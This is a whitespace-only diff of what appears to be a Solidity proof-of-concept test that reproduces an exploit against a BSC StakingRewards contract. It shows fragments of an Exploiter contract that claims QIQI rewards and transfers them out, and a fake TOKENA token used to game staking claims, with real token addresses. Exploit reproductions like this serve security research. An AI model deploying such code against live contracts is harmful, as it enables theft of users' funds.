@@ -21,11 +21,14 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IStakingRewards {
+
     function stake(address token, address token1, address token2, address up, uint256 amount) external;
     function claim(address token, address token1) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
     IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
@@ -109,9 +112,11 @@ contract ContractTest is Test {
             exploiter.claim(address(TokenA));
         }
     }
+
 }
 
 contract Exploiter {
+
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
     IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
@@ -126,9 +131,11 @@ contract Exploiter {
         StakingRewards.claim(address(QIQI), _recipient);
         QIQI.transfer(msg.sender, QIQI.balanceOf(address(this)));
     }
+
 }
 
 contract TOKENA {
+
     uint256 public totalSupply;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
@@ -171,4 +178,5 @@ contract TOKENA {
         totalSupply -= amount;
         emit Transfer(msg.sender, address(0), amount);
     }
+
 }
